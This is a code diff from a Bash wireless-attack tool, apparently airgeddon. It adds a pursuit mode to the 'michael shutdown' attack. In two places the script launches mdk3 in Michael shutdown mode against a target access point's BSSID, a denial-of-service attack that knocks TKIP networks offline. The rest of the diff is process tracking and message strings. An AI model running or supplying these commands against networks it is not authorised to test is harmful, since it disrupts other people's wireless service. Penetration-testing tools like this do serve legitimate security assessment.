@@ -2761,6 +2761,9 @@ function launch_dos_pursuit_mode_attack() {
 		"auth dos attack")
 			xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1 &
 		;;
+		"michael shutdown attack")
+			xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1 &
+		;;
 	esac
 
 	dos_pursuit_mode_attack_pid=$!
@@ -2952,11 +2955,22 @@ function exec_michaelshutdown() {
 	language_strings "${language}" 94 "title"
 	language_strings "${language}" 32 "green"
 
+	tmpfiles_toclean=1
+
 	echo
-	language_strings "${language}" 33 "yellow"
-	language_strings "${language}" 4 "read"
-	recalculate_windows_sizes
-	xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk3 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		language_strings "${language}" 506 "yellow"
+		language_strings "${language}" 4 "read"
+
+		dos_pursuit_mode_pids=()
+		launch_dos_pursuit_mode_attack "michael shutdown attack" "first_time"
+		pid_control_pursuit_mode "michael shutdown attack"
+	else
+		language_strings "${language}" 33 "yellow"
+		language_strings "${language}" 4 "read"
+		recalculate_windows_sizes
+		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk3 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
+	fi
 }
 
 #Validate Mdk3 parameters
